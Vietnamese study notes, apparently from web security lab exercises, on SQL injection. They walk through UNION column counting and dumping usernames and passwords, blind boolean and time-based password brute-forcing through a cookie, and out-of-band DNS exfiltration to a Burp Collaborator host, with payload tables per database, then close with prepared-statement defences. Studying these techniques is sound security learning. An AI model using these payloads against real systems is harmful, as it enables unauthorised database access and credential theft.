sau khi học phần này, mình hiểu là...
SQLi bản chất là chèn input vào query.
-> query vỡ cấu trúc.
=> chạy theo ý mình.

- UNION là in-band.
-> thấy data trả về luôn.
-> nên mình đếm cột trước.
- blind là không thấy data.
-> phải hỏi đúng / sai.
-> nên mình dùng boolean / time / OAST.
- phòng chống thì chỉ có 1 đường.
-> prepared statements.

chi tiết thì nằm ở mấy file rời mình đã ghi:
- [[các kỹ thuật chèn sql]]
- [[SQL cheet sheet]]
- [[union sql  injection]]
- [[xác định số cột&kiểu dl]]
- [[các bước thu thập thông tin về csdl]]
- [[tấn công mật khẩu]]
- [[Blind sql injection]]
- [[based error sql injection]]
- [[bai1- based errorr sql injection]]
- [[bai2-error based injection]]
- [[payload giúp brute force mật khẩu cho blind && error-sql]]

### 1. UNION
sau khi quan sát mấy lab UNION mình thấy...
luồng luôn giống nhau.
-> đếm cột.
-> tìm cột text.
-> đọc version.
-> đọc bảng users.

request đếm cột:
```
GET /filter?category=Gifts' ORDER BY 3-- HTTP/1.1
```
-> 200 là còn đủ cột.
-> 500 là lố.
=> lố ở 4 thì có 3 cột.

request verify:
```
GET /filter?category=Gifts' UNION SELECT NULL,NULL,NULL-- HTTP/1.1
```
-> 200 không lỗi là chốt.

request tìm cột text:
```
GET /filter?category=Gifts' UNION SELECT 'a','b','c'-- HTTP/1.1
```
-> chữ nào hiện lên trang là cột xài được.

| mục đích | payload mình hay dùng |
|---|---|
| đếm cột | `' ORDER BY 1--` tăng dần |
| verify cột | `' UNION SELECT NULL,NULL,NULL--` |
| tìm cột text | `' UNION SELECT 'a',NULL,NULL--` xoay từng cột |
| đọc version Oracle | `' UNION SELECT banner, NULL FROM v$version--` |
| đọc version MySQL | `' UNION SELECT @@version, NULL--` |
| đọc version Postgres | `' UNION SELECT version(), NULL--` |
| đọc users | `' UNION SELECT username, password FROM users--` |

request đọc users:
```
GET /filter?category=Gifts' UNION SELECT username, password FROM users-- HTTP/1.1
```
response:
```
administrator ... 9s4k7m2x0p1q6r8t5y3u
```
-> mình cầm password này đi login.
=> xem thêm [[union sql  injection]] và [[Lab-SQLi UNION retrieve version and users]].

### 2. blind boolean
sau khi học phần này, mình hiểu là...
server không ói data ra.
-> mình chỉ hỏi được đúng / sai.
-> nhìn chữ Welcome back! là biết.

request test:
```
Cookie: TrackingId=xyz' AND '1'='1
```
-> có Welcome back!.
request test tiếp:
```
Cookie: TrackingId=xyz' AND '1'='2
```
-> mất Welcome back!.
=> lệch nhau là dính blind.

request brute 1 ký tự:
```
Cookie: TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--
```
-> có Welcome là đúng ký tự.
-> không có là sai.
=> lặp hết 20 ký tự là ra password.
-> script mình để ở [[payload giúp brute force mật khẩu cho blind && error-sql]].
=> xem thêm [[Blind sql injection]] và [[Lab-Blind boolean conditional responses]].

### 3. blind time
sau khi quan sát lab time mình thấy...
không có khác biệt response.
-> phải đo giờ.
-> đúng thì sleep, sai thì không.

request delay vô điều kiện:
```
Cookie: TrackingId=x'||pg_sleep(10)--
```
-> response 10s là dính.
-> MySQL thì dùng `SLEEP(10)`.
-> MSSQL thì `WAITFOR DELAY '0:0:10'`.

request conditional:
```
Cookie: TrackingId=x';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
```
-> 1=1 sleep 10s.
-> đổi thành 1=2 thì trả về ngay.
=> confirm được conditional.

request exfil:
```
Cookie: TrackingId=x';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```
-> sleep là đúng ký tự.
=> xem thêm [[Lab-Blind time delays]].

### 4. OAST sơ lược
sau khi học phần này, mình hiểu là...
query chạy async.
-> không boolean được.
-> không time được.
-> nên mình bắt nó gọi ra ngoài.

request demo Oracle:
```
Cookie: TrackingId=xyz'||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://abc123.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual)--
```
-> Collaborator có DNS lookup là dính.
=> exfil thì nhét query vào subdomain.
-> xem thêm [[Lab-Blind OAST]].

| DB | gọi DNS kiểu gì |
|---|---|
| Oracle | `EXTRACTVALUE(xmltype(...))` / `UTL_INADDR.get_host_address(...)` |
| MSSQL | `exec master..xp_dirtree '//domain/a'` |
| Postgres | `copy ... to program 'nslookup domain'` |
| MySQL Win | `LOAD_FILE('\\\\domain\\a')` |

### 5. phòng chống
sau khi học xong mình chốt...
-> không concat string vào SQL.
-> nên mình dùng prepared statements.
-> bind param riêng.
-> query và data tách hẳn.

ví dụ sai:
```sql
SELECT * FROM users WHERE username = 'admin' AND password = '' 
-- input nối thẳng vào
```
ví dụ đúng (mô hình):
```sql
SELECT * FROM users WHERE username = ? AND password = ?
-- ? bind sau, không parse thành code
```
- least privilege cho DB user.
- tắt error verbose.
- WAF chỉ là lớp phụ.
=> xem thêm [[Minh_hoa_prepare_sql]] và [[các kỹ thuật chèn sql]].

> [!NOTE] bài học
> - UNION thì đếm cột -> tìm text -> đọc version -> đọc users.
> - blind thì chỉ có đúng / sai, phải brute.
> - time thì đo giây, OAST thì hóng Collaborator.
> - fix thì prepared statements, còn lại chỉ phụ.
